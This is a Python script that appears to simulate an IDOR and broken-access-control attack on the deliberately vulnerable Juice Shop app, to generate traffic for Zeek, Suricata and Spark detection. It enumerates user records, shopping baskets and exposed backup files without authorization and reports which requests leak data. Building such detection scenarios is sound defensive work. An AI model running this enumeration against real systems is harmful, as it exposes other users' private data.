#!/usr/bin/env python3
"""
Controlled Insecure Direct Object References (IDOR) & Broken Access Control Scenario.
Rapidly queries sequential user IDs and restricted resources without authorization.
Observed by: Zeek (http.log sequential ID traversal), Suricata
Detected by: Spark Structured Streaming & Backend Multi-Source Correlation
"""

import os
import time
import requests

TARGET_HOST = os.getenv("TARGET_HOST", "localhost")
TARGET_PORT = int(os.getenv("TARGET_PORT", 3000))
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

# Known Juice Shop endpoints vulnerable to IDOR / unauthorized enumeration
PROBE_TARGETS = [
    ("/api/Users/1", "IDOR User Record #1 (Admin profile)"),
    ("/api/Users/2", "IDOR User Record #2 (Jim profile)"),
    ("/api/Users/3", "IDOR User Record #3 (Bender profile)"),
    ("/api/Users/4", "IDOR User Record #4"),
    ("/rest/basket/1", "IDOR Basket #1 (Admin shopping cart)"),
    ("/rest/basket/2", "IDOR Basket #2 (User shopping cart)"),
    ("/ftp/legal.md", "Sensitive Directory Traversal Probe"),
    ("/ftp/coupons_2013.md.bak", "Exposed Backup Configuration Probe"),
    ("/ftp/package.json.bak", "Exposed Source Manifest Probe"),
    ("/rest/user/whoami", "Session Impersonation State Probe")
]

def run_idor_probe(delay: float = 0.2):
    print(f"\n[!] INITIATING CONTROLLED IDOR & BROKEN ACCESS CONTROL PROBE against {BASE_URL}...")
    headers = {
        "User-Agent": "Mozilla/5.0 (Security-Scanner/IDOR-Audit-Tool)",
        "Accept": "application/json, text/plain, */*"
    }
    
    success_count = 0
    results = []
    
    for idx, (path, desc) in enumerate(PROBE_TARGETS):
        url = f"{BASE_URL}{path}"
        try:
            r = requests.get(url, headers=headers, timeout=2.0)
            status = r.status_code
            size = len(r.content)
            results.append((path, status, size))
            if status in [200, 304]:
                success_count += 1
                print(f"  [{idx+1}/{len(PROBE_TARGETS)}] GET {path:24} -> HTTP {status} ({size} bytes) [POTENTIAL IDOR LEAK: {desc}]")
            else:
                print(f"  [{idx+1}/{len(PROBE_TARGETS)}] GET {path:24} -> HTTP {status} [Access Restricted]")
        except Exception as e:
            print(f"  [{idx+1}/{len(PROBE_TARGETS)}] GET {path:24} -> Error: {e}")
        time.sleep(delay)
        
    print(f"[+] IDOR probe finished: {success_count}/{len(PROBE_TARGETS)} endpoints returned exposed data.")
    print(f"[*] Telemetry transmitted to Zeek & Suricata for access-pattern anomaly detection.")
    return results

if __name__ == "__main__":
    run_idor_probe()
